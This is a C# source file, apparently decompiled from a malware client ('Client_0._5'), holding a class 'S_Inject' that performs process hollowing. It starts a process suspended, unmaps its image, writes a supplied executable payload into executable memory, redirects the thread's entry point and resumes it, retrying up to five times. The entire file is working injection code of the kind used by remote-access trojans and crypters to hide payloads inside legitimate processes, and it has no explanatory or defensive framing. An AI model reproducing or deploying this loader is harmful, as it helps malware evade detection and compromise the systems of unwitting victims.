using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
using Microsoft.VisualBasic.CompilerServices;

namespace Client_0._5;

public class S_Inject
{
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct PROCESS_INFORMATION
	{
		public IntPtr ProcessHandle;

		public IntPtr ThreadHandle;

		public uint ProcessId;

		public uint ThreadId;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct STARTUP_INFORMATION
	{
		public uint Size_;

		public string Reserved1;

		public string Desktop;

		public string Title;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public IntPtr Reserved2;

		public IntPtr StdInput;

		public IntPtr StdOutput;

		public IntPtr StdError;
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool GetThreadContext(IntPtr thread, int[] context);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool SetThreadContext(IntPtr thread, int[] context);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	[DllImport("ntdll.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

	[DllImport("kernel32.dll")]
	[SuppressUnmanagedCodeSecurity]
	private static extern int ResumeThread(IntPtr handle);

	public static bool injRun(string path, string cmd, byte[] data, bool compatible)
	{
		int num = 1;
		do
		{
			if (!HandleRun(path, cmd, data, compatible))
			{
				num = checked(num + 1);
				continue;
			}
			return true;
		}
		while (num <= 5);
		return false;
	}

	private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
	{
		string text = $"\"{path}\"";
		STARTUP_INFORMATION startupInfo = default(STARTUP_INFORMATION);
		PROCESS_INFORMATION processInformation = default(PROCESS_INFORMATION);
		startupInfo.dwFlags = 0;
		checked
		{
			startupInfo.Size_ = (uint)Marshal.SizeOf(typeof(STARTUP_INFORMATION));
			try
			{
				if (!string.IsNullOrEmpty(cmd))
				{
					text = text + " " + cmd;
				}
				if (!CreateProcess(path, text, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(data, 60);
				int num2 = BitConverter.ToInt32(data, num + 52);
				int[] array = new int[179];
				array[0] = 65538;
				if (IntPtr.Size == 4)
				{
					if (!GetThreadContext(processInformation.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!Wow64GetThreadContext(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
				int num3 = array[41];
				int buffer = default(int);
				int bytesRead = default(int);
				if (!ReadProcessMemory(processInformation.ProcessHandle, num3 + 8, ref buffer, 4, ref bytesRead))
				{
					throw new Exception();
				}
				if (num2 == buffer && NtUnmapViewOfSection(processInformation.ProcessHandle, buffer) != 0)
				{
					throw new Exception();
				}
				int length = BitConverter.ToInt32(data, num + 80);
				int bufferSize = BitConverter.ToInt32(data, num + 84);
				int num4 = VirtualAllocEx(processInformation.ProcessHandle, num2, length, 12288, 64);
				bool flag = default(bool);
				if (!compatible && num4 == 0)
				{
					flag = true;
					num4 = VirtualAllocEx(processInformation.ProcessHandle, 0, length, 12288, 64);
				}
				if (num4 == 0)
				{
					throw new Exception();
				}
				if (!WriteProcessMemory(processInformation.ProcessHandle, num4, data, bufferSize, ref bytesRead))
				{
					throw new Exception();
				}
				int num5 = num + 248;
				int num6 = BitConverter.ToInt16(data, num + 6) - 1;
				for (int i = 0; i <= num6; i++)
				{
					int num7 = BitConverter.ToInt32(data, num5 + 12);
					int num8 = BitConverter.ToInt32(data, num5 + 16);
					int srcOffset = BitConverter.ToInt32(data, num5 + 20);
					if (num8 != 0)
					{
						byte[] array2 = new byte[num8 - 1 + 1];
						Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
						if (!WriteProcessMemory(processInformation.ProcessHandle, num4 + num7, array2, array2.Length, ref bytesRead))
						{
							throw new Exception();
						}
					}
					num5 += 40;
				}
				byte[] bytes = BitConverter.GetBytes(num4);
				if (!WriteProcessMemory(processInformation.ProcessHandle, num3 + 8, bytes, 4, ref bytesRead))
				{
					throw new Exception();
				}
				int num9 = BitConverter.ToInt32(data, num + 40);
				if (flag)
				{
					num4 = num2;
				}
				array[44] = num4 + num9;
				if (IntPtr.Size == 4)
				{
					if (!SetThreadContext(processInformation.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!Wow64SetThreadContext(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
				if (ResumeThread(processInformation.ThreadHandle) == -1)
				{
					throw new Exception();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Process.GetProcessById((int)processInformation.ProcessId)?.Kill();
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}
}
